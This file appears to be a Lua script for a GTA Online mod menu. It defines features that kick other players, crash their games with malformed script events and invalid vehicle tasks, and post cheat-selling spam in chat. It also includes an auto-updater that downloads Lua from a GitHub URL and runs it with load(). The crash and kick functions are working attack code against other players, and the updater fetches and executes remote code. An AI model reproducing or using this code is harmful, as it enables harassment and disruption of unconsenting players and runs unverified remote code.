NATIVE = require("Natives")

local script_version = "1.0.0"

local m = {
    title = title or "Test",
    nam = ui.notify_above_map,
    n = menu.notify,
    af = menu.add_feature,
    apf = menu.add_player_feature,
    ct = menu.create_thread,
    red = 0x0000FF,
    blue = 0xFF0000,
    green = 0x00FF00,
    yellow = 0x00FFFF,
    purple = 0xFF800080,
    orange = 0xFF0080FF,
    brown = 0xFF336699,
    pink = 0xFFFF00FF,
    white = 0xFFFFFF,
    black = 0x000000
}

ExampleScript = true
local http_trusted_off

if ExampleScript and menu.is_trusted_mode_enabled(1 << 3) and menu.is_trusted_mode_enabled(1 << 2) then
    m.ct(function()
        local vercheckKeys = { ctrl = MenuKey(), space = MenuKey(), enter = MenuKey(), rshift = MenuKey() }
        vercheckKeys.ctrl:push_vk(0x11);
        vercheckKeys.space:push_vk(0x20);
        vercheckKeys.enter:push_vk(0x0D);
        vercheckKeys.rshift:push_vk(0xA1)
        local response_code, github_version = web.get("https://raw.githubusercontent.com/SG-69/666/main/example/Version.txt")
        if response_code == 200 then
            github_version = github_version:gsub("[\r\n]", "")
            if github_version ~= script_version then
                local text_size = graphics.get_screen_width() * graphics.get_screen_height() / 3686400 * 0.5 + 0.5
                local strings = { version_compare = "\nCurrent Version:" ..
                    script_version .. "\nLatest Version:" .. github_version,
                    version_compare_x_offset = v2(-
                        scriptdraw.get_text_size("\nCurrent Version:" ..
                            script_version .. "\nLatest Version:" .. github_version, text_size).x /
                        graphics.get_screen_width(), 0),
                    new_ver_x_offset = v2(-
                        scriptdraw.get_text_size("New version available. Press CTRL or SPACE to skip or press ENTER or RIGHT SHIFT to update."
                            , text_size).x / graphics.get_screen_width(), 0) }
                strings.changelog_rc, strings.changelog = web.get("https://raw.githubusercontent.com/SG-69/666/main/example/Changelog.txt")
                if strings.changelog_rc == 200 then
                    strings.changelog = "\n\n\nChangelog:\n" .. strings.changelog
                else
                    strings.changelog = ""
                end
                strings.changelog_x_offset = v2(-scriptdraw.get_text_size(strings.changelog, text_size).x /
                    graphics.get_screen_width(), 0)
                local stringV2size = v2(2, 2)
                while true do
                    scriptdraw.draw_text("New version available. Press CTRL or SPACE to skip or press ENTER or RIGHT SHIFT to update."
                        , strings.new_ver_x_offset, stringV2size, text_size, 0xFFFFFFFF, 2)
                    scriptdraw.draw_text(strings.version_compare, strings.version_compare_x_offset, stringV2size,
                        text_size, 0xFFFFFFFF, 2)
                    scriptdraw.draw_text(strings.changelog, strings.changelog_x_offset, stringV2size, text_size,
                        0xFFFFFFFF
                        , 2)
                    if vercheckKeys.ctrl:is_down() or vercheckKeys.space:is_down() then
                        MainScript()
                        break
                    elseif vercheckKeys.enter:is_down() or vercheckKeys.rshift:is_down() then
                        local response_code, auto_updater = web.get([[https://raw.githubusercontent.com/SG-69/666/main/example/AutoUpdater.lua]])
                        if response_code == 200 then
                            auto_updater = load(auto_updater)
                            m.ct(function()
                                m.n("Update started, please wait...", m.title, 3, m.red)
                                local status_ = auto_updater()
                                if status_ then
                                    if type(status_) == "string" then
                                        m.n("Updating local files failed, one or more of the files could not be opened.\nThere is a high chance the files got corrupted, please redownload the menu."
                                            , m.title, 3, m.red)
                                    else
                                        m.n("Update succeeded, please reload the Project Higurashi.", m.title, 3, m.green)
                                        dofile(utils.get_appdata_path("PopstarDevs", "2Take1Menu") ..
                                            "\\scripts\\ProjectHigurashi.lua")
                                    end
                                else
                                    m.n("Download for updated files failed, current files have not been replaced.",
                                        m.title, 3, m.green)
                                end
                            end, nil)
                            break
                        else
                            m.n("Getting Updater failed. Check your connection and try downloading manually.", m.title, 3
                                , m.red)
                        end
                    end
                    s.wait(0)
                end
            else
                MainScript()
            end
        end
    end, nil)
else
    if menu.is_trusted_mode_enabled(1 << 2) then
        http_trusted_off = true
    else
        m.n("Trusted mode > Natives has to be on. If you wish for auto updates enable Http too.", m.title, 3, m.red)
    end
end
function MainScript()
    Parent1 = m.apf("Test", "parent", 0).id

    Parent2 = m.af("Test", "parent", 0)

    new_session_timer = utils.time_ms()

    function request_control(...)
        local Entity, time_to_wait, no_condition = ...
        if not network.has_control_of_entity(Entity) and entity.is_an_entity(Entity) and
            (not entity.is_entity_a_ped(Entity) or not ped.is_ped_a_player(Entity)) and
            utils.time_ms() > new_session_timer then
            local time = utils.time_ms() + (time_to_wait or 450)
            network.request_control_of_entity(Entity, true)
            while not network.has_control_of_entity(Entity) and entity.is_an_entity(Entity) and time > utils.time_ms() do
                system.yield(0)
            end
        end
        return network.has_control_of_entity(Entity)
    end

    m.apf("Smart Kick", "action", Parent1, function(f, pid)
        if pid ~= player.player_id() and player.is_player_valid(pid) and not player.is_player_friend(pid) then
            if network.network_is_host() then
                network.network_session_kick_player(pid)
                return
            end
            network.force_remove_player(pid)
        else
            return
        end
    end)

    m.apf("Script Crash", "action", Parent1, function(f, pid)
        if not pid ~= player.player_id() and player.is_player_valid(pid) and not player.is_player_friend(pid) then
            for i = 1, 25 do
                script.trigger_script_event_2(1 << pid, 0x20B1027C, player.player_id(), -3490044087,
                    math.random(-2147483647, 2147483647), 1, 0, 0, 0, 0, 0, pid, player.player_id(), math.random(0, 31),
                    math.random(0, 31))
            end
            script.trigger_script_event(0x69D985D7, pid, { pid, -1337, math.random(13000, 99999), -3301 })
            script.trigger_script_event(0xCA1592A7, pid, { pid, -1337, 2147483647, -3301 })
            script.trigger_script_event(0x34672EB0, pid, { pid, -1337, math.random(16999999, 99999999), -3301 })
            --[[if script.get_host_of_this_script() == pid then
            script.trigger_script_event(0x1D8D820C, pid, {pid, 0, 0, -13370, -33019, 0})
        else
            return
        end]]
            m.n("Sending crash to " .. player.get_player_name(pid), m.title, 3, m.yellow)
        else
            return
        end
    end)

    m.apf("Invalid Task Crash", "action", Parent1, function(f, pid)
        if not pid ~= player.player_id() and player.is_player_valid(pid) and not player.is_player_friend(pid) then
            for _, vehs in ipairs(vehicle.get_all_vehicles()) do
                request_control(vehs)
                for x = 0, 10 do
                    NATIVE.TASK_VEHICLE_TEMP_ACTION(player.get_player_ped(pid), vehs, 18, 1)
                end
                m.n("Sending crash to " .. player.get_player_name(pid), m.title, 3, m.yellow)
            end
        else
            return
        end
    end)

    m.af("Fake Chinese Advertisement", "action", Parent2.id, function(f)
        network.send_chat_message("【微信：GTAV6699】【QQ33011337】需要/刷钱科技/改等级外挂/无敌/瞬移【匿名搜索:暮蟬商店】全网100多种外挂任你挑选/科技名称/科技价格/功能介绍（新店搞活动 下单有优惠）诚招代理"
            , false)
    end)

end
